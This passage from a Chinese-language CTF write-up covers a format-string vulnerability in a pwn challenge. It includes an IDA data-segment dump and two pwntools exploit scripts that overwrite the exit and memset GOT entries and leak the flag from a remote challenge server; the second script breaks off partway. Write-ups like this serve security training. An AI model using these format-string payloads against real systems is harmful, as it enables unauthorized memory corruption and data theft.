style="--cjk-x:-96px;--cjk-y:-48px">们</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-848px">输</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-80px">入</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-896px">金</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:-944px">额</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-672px">等</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-32px">于</span> `0xff` <span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-448px">时</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-80px">候</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-160px">可</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-48px">以</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-784px">触</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-160px">发</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-496px">格</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-320px">式</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-128px">化</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-256px">字</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-672px">符</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-16px">串</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-560px">漏</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-544px">洞</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span>
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-736px">至</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-32px">于</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-240px">如</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-64px">何</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-256px">实</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-448px">无</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-912px">限</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-512px">次</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-496px">格</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-320px">式</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-128px">化</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-256px">字</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-672px">符</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-16px">串</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-880px">里</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-432px">改</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span> `exit` <span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span> got entry <span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span> main <span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-112px">函</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-448px">数</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-208px">地</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-208px">址</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span>
+
+```asm showLineNumbers=false {10} del={252} collapse={13-249}
+.data:00000000004040A0 ; =======================================================
+====================
+.data:00000000004040A0
+.data:00000000004040A0 ; Segment type: Pure data
+.data:00000000004040A0 ; Segment permissions: Read/Write
+.data:00000000004040A0 _data           segment align_32 public 'DATA' use64
+.data:00000000004040A0                 assume cs:_data
+.data:00000000004040A0                 ;org 4040A0h
+.data:00000000004040A0                 align 40h
+.data:00000000004040C0 ; int log_file_open_flags_input
+.data:00000000004040C0 log_file_open_flags_input db 'everything is ok~',0
+.data:00000000004040C0                                         ; DATA XREF: main
++245↑o
+.data:00000000004040C0                                         ; main+254↑o ...
+.data:00000000004040D2                 db    0
+.data:00000000004040D3                 db    0
+.data:00000000004040D4                 db    0
+.data:00000000004040D5                 db    0
+.data:00000000004040D6                 db    0
+.data:00000000004040D7                 db    0
+.data:00000000004040D8                 db    0
+.data:00000000004040D9                 db    0
+.data:00000000004040DA                 db    0
+.data:00000000004040DB                 db    0
+.data:00000000004040DC                 db    0
+.data:00000000004040DD                 db    0
+.data:00000000004040DE                 db    0
+.data:00000000004040DF                 db    0
+.data:00000000004040E0                 db    0
+.data:00000000004040E1                 db    0
+.data:00000000004040E2                 db    0
+.data:00000000004040E3                 db    0
+.data:00000000004040E4                 db    0
+.data:00000000004040E5                 db    0
+.data:00000000004040E6                 db    0
+.data:00000000004040E7                 db    0
+.data:00000000004040E8                 db    0
+.data:00000000004040E9                 db    0
+.data:00000000004040EA                 db    0
+.data:00000000004040EB                 db    0
+.data:00000000004040EC                 db    0
+.data:00000000004040ED                 db    0
+.data:00000000004040EE                 db    0
+.data:00000000004040EF                 db    0
+.data:00000000004040F0                 db    0
+.data:00000000004040F1                 db    0
+.data:00000000004040F2                 db    0
+.data:00000000004040F3                 db    0
+.data:00000000004040F4                 db    0
+.data:00000000004040F5                 db    0
+.data:00000000004040F6                 db    0
+.data:00000000004040F7                 db    0
+.data:00000000004040F8                 db    0
+.data:00000000004040F9                 db    0
+.data:00000000004040FA                 db    0
+.data:00000000004040FB                 db    0
+.data:00000000004040FC                 db    0
+.data:00000000004040FD                 db    0
+.data:00000000004040FE                 db    0
+.data:00000000004040FF                 db    0
+.data:0000000000404100                 db    0
+.data:0000000000404101                 db    0
+.data:0000000000404102                 db    0
+.data:0000000000404103                 db    0
+.data:0000000000404104                 db    0
+.data:0000000000404105                 db    0
+.data:0000000000404106                 db    0
+.data:0000000000404107                 db    0
+.data:0000000000404108                 db    0
+.data:0000000000404109                 db    0
+.data:000000000040410A                 db    0
+.data:000000000040410B                 db    0
+.data:000000000040410C                 db    0
+.data:000000000040410D                 db    0
+.data:000000000040410E                 db    0
+.data:000000000040410F                 db    0
+.data:0000000000404110                 db    0
+.data:0000000000404111                 db    0
+.data:0000000000404112                 db    0
+.data:0000000000404113                 db    0
+.data:0000000000404114                 db    0
+.data:0000000000404115                 db    0
+.data:0000000000404116                 db    0
+.data:0000000000404117                 db    0
+.data:0000000000404118                 db    0
+.data:0000000000404119                 db    0
+.data:000000000040411A                 db    0
+.data:000000000040411B                 db    0
+.data:000000000040411C                 db    0
+.data:000000000040411D                 db    0
+.data:000000000040411E                 db    0
+.data:000000000040411F                 db    0
+.data:0000000000404120                 db    0
+.data:0000000000404121                 db    0
+.data:0000000000404122                 db    0
+.data:0000000000404123                 db    0
+.data:0000000000404124                 db    0
+.data:0000000000404125                 db    0
+.data:0000000000404126                 db    0
+.data:0000000000404127                 db    0
+.data:0000000000404128                 db    0
+.data:0000000000404129                 db    0
+.data:000000000040412A                 db    0
+.data:000000000040412B                 db    0
+.data:000000000040412C                 db    0
+.data:000000000040412D                 db    0
+.data:000000000040412E                 db    0
+.data:000000000040412F                 db    0
+.data:0000000000404130                 db    0
+.data:0000000000404131                 db    0
+.data:0000000000404132                 db    0
+.data:0000000000404133                 db    0
+.data:0000000000404134                 db    0
+.data:0000000000404135                 db    0
+.data:0000000000404136                 db    0
+.data:0000000000404137                 db    0
+.data:0000000000404138                 db    0
+.data:0000000000404139                 db    0
+.data:000000000040413A                 db    0
+.data:000000000040413B                 db    0
+.data:000000000040413C                 db    0
+.data:000000000040413D                 db    0
+.data:000000000040413E                 db    0
+.data:000000000040413F                 db    0
+.data:0000000000404140                 db    0
+.data:0000000000404141                 db    0
+.data:0000000000404142                 db    0
+.data:0000000000404143                 db    0
+.data:0000000000404144                 db    0
+.data:0000000000404145                 db    0
+.data:0000000000404146                 db    0
+.data:0000000000404147                 db    0
+.data:0000000000404148                 db    0
+.data:0000000000404149                 db    0
+.data:000000000040414A                 db    0
+.data:000000000040414B                 db    0
+.data:000000000040414C                 db    0
+.data:000000000040414D                 db    0
+.data:000000000040414E                 db    0
+.data:000000000040414F                 db    0
+.data:0000000000404150                 db    0
+.data:0000000000404151                 db    0
+.data:0000000000404152                 db    0
+.data:0000000000404153                 db    0
+.data:0000000000404154                 db    0
+.data:0000000000404155                 db    0
+.data:0000000000404156                 db    0
+.data:0000000000404157                 db    0
+.data:0000000000404158                 db    0
+.data:0000000000404159                 db    0
+.data:000000000040415A                 db    0
+.data:000000000040415B                 db    0
+.data:000000000040415C                 db    0
+.data:000000000040415D                 db    0
+.data:000000000040415E                 db    0
+.data:000000000040415F                 db    0
+.data:0000000000404160                 db    0
+.data:0000000000404161                 db    0
+.data:0000000000404162                 db    0
+.data:0000000000404163                 db    0
+.data:0000000000404164                 db    0
+.data:0000000000404165                 db    0
+.data:0000000000404166                 db    0
+.data:0000000000404167                 db    0
+.data:0000000000404168                 db    0
+.data:0000000000404169                 db    0
+.data:000000000040416A                 db    0
+.data:000000000040416B                 db    0
+.data:000000000040416C                 db    0
+.data:000000000040416D                 db    0
+.data:000000000040416E                 db    0
+.data:000000000040416F                 db    0
+.data:0000000000404170                 db    0
+.data:0000000000404171                 db    0
+.data:0000000000404172                 db    0
+.data:0000000000404173                 db    0
+.data:0000000000404174                 db    0
+.data:0000000000404175                 db    0
+.data:0000000000404176                 db    0
+.data:0000000000404177                 db    0
+.data:0000000000404178                 db    0
+.data:0000000000404179                 db    0
+.data:000000000040417A                 db    0
+.data:000000000040417B                 db    0
+.data:000000000040417C                 db    0
+.data:000000000040417D                 db    0
+.data:000000000040417E                 db    0
+.data:000000000040417F                 db    0
+.data:0000000000404180                 db    0
+.data:0000000000404181                 db    0
+.data:0000000000404182                 db    0
+.data:0000000000404183                 db    0
+.data:0000000000404184                 db    0
+.data:0000000000404185                 db    0
+.data:0000000000404186                 db    0
+.data:0000000000404187                 db    0
+.data:0000000000404188                 db    0
+.data:0000000000404189                 db    0
+.data:000000000040418A                 db    0
+.data:000000000040418B                 db    0
+.data:000000000040418C                 db    0
+.data:000000000040418D                 db    0
+.data:000000000040418E                 db    0
+.data:000000000040418F                 db    0
+.data:0000000000404190                 db    0
+.data:0000000000404191                 db    0
+.data:0000000000404192                 db    0
+.data:0000000000404193                 db    0
+.data:0000000000404194                 db    0
+.data:0000000000404195                 db    0
+.data:0000000000404196                 db    0
+.data:0000000000404197                 db    0
+.data:0000000000404198                 db    0
+.data:0000000000404199                 db    0
+.data:000000000040419A                 db    0
+.data:000000000040419B                 db    0
+.data:000000000040419C                 db    0
+.data:000000000040419D                 db    0
+.data:000000000040419E                 db    0
+.data:000000000040419F                 db    0
+.data:00000000004041A0                 db    0
+.data:00000000004041A1                 db    0
+.data:00000000004041A2                 db    0
+.data:00000000004041A3                 db    0
+.data:00000000004041A4                 db    0
+.data:00000000004041A5                 db    0
+.data:00000000004041A6                 db    0
+.data:00000000004041A7                 db    0
+.data:00000000004041A8                 db    0
+.data:00000000004041A9                 db    0
+.data:00000000004041AA                 db    0
+.data:00000000004041AB                 db    0
+.data:00000000004041AC                 db    0
+.data:00000000004041AD                 db    0
+.data:00000000004041AE                 db    0
+.data:00000000004041AF                 db    0
+.data:00000000004041B0                 db    0
+.data:00000000004041B1                 db    0
+.data:00000000004041B2                 db    0
+.data:00000000004041B3                 db    0
+.data:00000000004041B4                 db    0
+.data:00000000004041B5                 db    0
+.data:00000000004041B6                 db    0
+.data:00000000004041B7                 db    0
+.data:00000000004041B8                 db    0
+.data:00000000004041B9                 db    0
+.data:00000000004041BA                 db    0
+.data:00000000004041BB                 db    0
+.data:00000000004041BC                 db    0
+.data:00000000004041BD                 db    0
+.data:00000000004041BE                 db    0
+.data:00000000004041BF                 db    0
+.data:00000000004041C0 ; char format[]
+.data:00000000004041C0 format          db 'You are so parsimonious!!!',0
+.data:00000000004041C0                                         ; DATA XREF: main
++112↑o
+.data:00000000004041DB                 align 20h
+.data:00000000004041E0 ; char aThankYouForPay[]
+.data:00000000004041E0 aThankYouForPay db 'Thank you for paying,let me give you 
+flag: ',0
+.data:00000000004041E0                                         ; DATA XREF: main
+:loc_4014EA↑o
+.data:000000000040420C                 align 20h
+.data:0000000000404220 ; char a1m31mError0mSo[]
+.data:0000000000404220 a1m31mError0mSo db 0Ah                  ; DATA XREF: main
++21D↑o
+.data:0000000000404221                 db 1Bh,'[1m',1Bh,'[31m==========error!!!=
+========= ',1Bh,'[0m ',0Ah
+.data:000000000040424D                 db 'Sorry, but maybe something wrong... '
+,0Ah
+.data:0000000000404272                 db 'you can report it in user.log',0
+.data:0000000000404290                 align 20h
+.data:00000000004042A0 ; char aOkNowYouCanExi[]
+.data:00000000004042A0 aOkNowYouCanExi db 'OK,now you can exit or try again.',0
+.data:00000000004042A0                                         ; DATA XREF: main
++2A7↑o
+.data:00000000004042A0 _data           ends
+.data:00000000004042A0
+```
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:0px">下</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-928px">面</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-96px">写</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:0px">两</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span> exp<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-672px">第</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-352px">思</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-832px">路</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-432px">改</span> `memset` <span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span> `ret` <span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-800px">让</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-256px">它</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-784px">要</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-560px">清</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-672px">空</span> flag<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-576px">然</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-608px">用</span>
+ `%p` <span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-848px">输</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-112px">出</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-48px">但</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-160px">发</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-160px">只</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-480px">有</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-480px">本</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-208px">地</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-864px">通</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-864px">远</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-672px">程</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-640px">知</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-880px">道</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-192px">啥</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-784px">行</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-576px">然</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:-416px">换</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-656px">种</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-384px">打</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-528px">法</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span>`fopen` 
+<span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-48px">会</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-864px">返</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-208px">回</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span> `FILE` <span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-704px">结</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-480px">构</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-64px">体</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-16px">之</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span> `fgets` <span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-48px">会</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-208px">在</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-880px">里</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-928px">面</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-432px">放</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-32px">些</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-208px">地</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-208px">址</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-96px">其</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-16px">中</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-480px">有</span> flag <span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span> st
+ream buf <span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-832px">起</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-240px">始</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-208px">地</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-208px">址</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-48px">们</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-384px">把</span> fopen <span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-864px">返</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-208px">回</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-208px">地</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-208px">址</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-528px">泄</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-560px">漏</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-688px">算</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:0px">下</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-256px">它</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-176px">和</span> flag stream buf <span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-80px">偏</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-672px">移</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-160px">发</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-512px">此</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-80px">值</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-208px">固</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-256px">定</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-336px">得</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-112px">到</span> flag <span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-208px">地</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-208px">址</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-96px">写</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-112px">到</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-496px">栈</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:0px">上</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-608px">用</span> `%s` <span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-848px">输</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-112px">出</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-240px">好</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span>
+
+## Exploit I
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    ELF,
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = &quot;./patched&quot;
+HOST, PORT = &quot;8.147.135.220&quot;, 24630
+
+context(log_level=&quot;debug&quot;, binary=FILE, terminal=&quot;kitty&quot;)
+
+elf = context.binary
+
+
+def lehex_to_ascii(s: str) -&gt; str:
+    parts = s.strip().split(&quot;-&quot;)
+    out = bytearray()
+    for p in parts:
+        p = p.strip()
+        if not p:
+            continue
+        h = p[2:] if p.startswith((&quot;0x&quot;, &quot;0X&quot;)) else p
+        h = h.strip()
+        if len(h) % 2:  # pad odd-length hex
+            h = &quot;0&quot; + h
+        out += bytes.fromhex(h)[::-1]
+    return out.rstrip(b&quot;x00&quot;).decode(&quot;ascii&quot;, errors=&quot;replace&quot;)
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    target.sendlineafter(b&quot;2.exit&quot;, b&quot;1&quot;)
+    target.sendlineafter(b&quot;pay?x0a&quot;, b&quot;255&quot;)
+
+    payload = flat(
+        b&quot;A&quot; * 0x100,
+        b&quot;%5019c%12$hn&quot;,
+    )
+    target.sendlineafter(b&quot;report:&quot;, payload)
+
+    target.sendlineafter(b&quot;2.exit&quot;, b&quot;1&quot;)
+    # raw_input(&quot;DEBUG&quot;)
+    target.sendlineafter(b&quot;pay?x0a&quot;, flat(elf.got[&quot;exit&quot;]))
+
+    # raw_input(&quot;DEBUG&quot;)
+    target.sendlineafter(b&quot;2.exit&quot;, b&quot;2&quot;)
+
+    target.sendlineafter(b&quot;2.exit&quot;, b&quot;1&quot;)
+    target.sendlineafter(b&quot;pay?x0a&quot;, b&quot;255&quot;)
+
+    payload = flat(
+        b&quot;A&quot; * 0x100,
+        b&quot;%173c%12$hhn&quot;,
+    )
+    target.sendlineafter(b&quot;report:&quot;, payload)
+
+    target.sendlineafter(b&quot;2.exit&quot;, b&quot;1&quot;)
+    # raw_input(&quot;DEBUG&quot;)
+    target.sendlineafter(b&quot;pay?x0a&quot;, flat(elf.got[&quot;memset&quot;]))
+
+    # raw_input(&quot;DEBUG&quot;)
+    target.sendlineafter(b&quot;2.exit&quot;, b&quot;2&quot;)
+    target.sendlineafter(b&quot;2.exit&quot;, b&quot;1&quot;)
+    target.sendlineafter(b&quot;pay?x0a&quot;, b&quot;255&quot;)
+
+    payload = flat(
+        b&quot;A&quot; * 0x100,
+        b&quot;%14$p-%15$p-%16$p-%17$p-%18$p-%19$p&quot;,
+    )
+    target.sendlineafter(b&quot;report:&quot;, payload)
+    target.sendlineafter(b&quot;2.exit&quot;, b&quot;1&quot;)
+    target.sendlineafter(b&quot;pay?x0a&quot;, b&quot;0&quot;)
+
+    flag = target.recvuntil(b&quot;welcome&quot;)[:-7]
+    target.success(lehex_to_ascii(flag.decode()))
+
+    target.interactive()
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+```
+
+## Exploit II
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    ELF,
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = &quot;./patched&quot;
+HOST, PORT = &quot;8.147.135.220&quot;, 24630
+
+context(log_level=&quot;debug&quot;, binary=FILE, terminal=&quot;kitty&quot;)
+
+elf = context.binary
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    target.sendlineafter(b&quot;2.exit&quot;, b&quot;1&quot;)
